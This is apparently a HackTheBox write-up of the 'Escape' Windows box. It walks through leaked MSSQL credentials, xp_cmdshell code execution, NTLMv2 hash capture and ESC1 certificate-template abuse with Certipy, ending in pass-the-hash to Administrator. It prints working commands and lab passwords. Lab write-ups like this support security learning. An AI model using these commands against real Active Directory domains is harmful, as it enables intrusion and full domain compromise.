---
title: "HTB: Escape — AD Certificate Services Abuse"
date: 2026-03-10
type: writeup
topic: cybersecurity
platform: HackTheBox
category: active-directory
difficulty: medium
tools: [nmap, bloodhound, certipy, evil-winrm, impacket]
outcome: completed
tags: [AD-CS, ESC1, kerberos, privilege-escalation, windows, silver-ticket]
audience: [tech]
summary: "Walkthrough of HTB Escape — exploiting a misconfigured AD Certificate Services template to escalate from low-privileged user to Domain Admin via ESC1."
public: true
---

## Box Info

| | |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Medium |
| My completion | 2026-03-10 |

## My Approach

This box is heavily AD-CS focused. I came in knowing the general ESC attack categories from the SpecterOps whitepaper, so I went looking for certificate template misconfigurations early. The initial foothold through MSSQL was the part I expected to take longest.

## Enumeration

```bash
nmap -sC -sV -oA escape 10.10.11.202
```

Open ports: 53 (DNS), 88 (Kerberos), 135, 139, 389 (LDAP), 445 (SMB), 1433 (MSSQL), 3268.

The combination of 88, 389, and 1433 tells me: domain controller running MSSQL. Immediately interesting.

SMB enumeration found a readable share — `Public` — with a PDF containing SQL credentials in cleartext.

## Foothold

Used the leaked MSSQL credentials to authenticate:

```bash
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```

Enabled `xp_cmdshell` → RCE as the SQL service account (`sql_svc`).

Grabbed a shell via a PowerShell reverse shell, then grabbed `sql_svc`'s NTLMv2 hash by triggering an outbound connection to my machine with Responder running.

Cracked offline → `REGGIE1234ronnie`. Password reuse: `ryan.cooper:NuclearMossi7f5`.

## Privilege Escalation

With `ryan.cooper`'s credentials, ran Certipy to enumerate certificate templates:

```bash
certipy find -u ryan.cooper@sequel.htb -p 'NuclearMossi7f5' -dc-ip 10.10.11.202
```

Found **ESC1**: `UserAuthentication` template allowed Subject Alternative Name (SAN) specification by the enrollee and had `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set. Any domain user could enroll and request a cert as Administrator.

```bash
certipy req -u ryan.cooper@sequel.htb -p 'NuclearMossi7f5' \
  -ca sequel-DC-CA -template UserAuthentication \
  -upn administrator@sequel.htb -dc-ip 10.10.11.202
```

Used the resulting certificate to authenticate and retrieve the Administrator hash via PKINIT:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

Got the NT hash → pass-the-hash with Evil-WinRM → root.

## Key Takeaways

1. **Credential hygiene in shared resources** — the entire chain started with a PDF in an open SMB share. That's the most common initial foothold in real engagements too.
2. **ESC1 is still everywhere** — any time you see an AD-CS deployment, check template enrollee permissions and SAN flags before anything else.
3. **Certipy is the tool** — it automates the entire ESC detection and exploitation workflow cleanly.

## Tools Used

| Tool | Use |
|---|---|
| nmap | Initial port and service enumeration |
| impacket-mssqlclient | MSSQL authentication and xp_cmdshell |
| Responder | Captured NTLMv2 hash from outbound connection |
| Certipy | AD-CS vulnerability enumeration and ESC1 exploitation |
| Evil-WinRM | Shell as Administrator via pass-the-hash |

## References

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy GitHub](https://github.com/ly4k/Certipy)

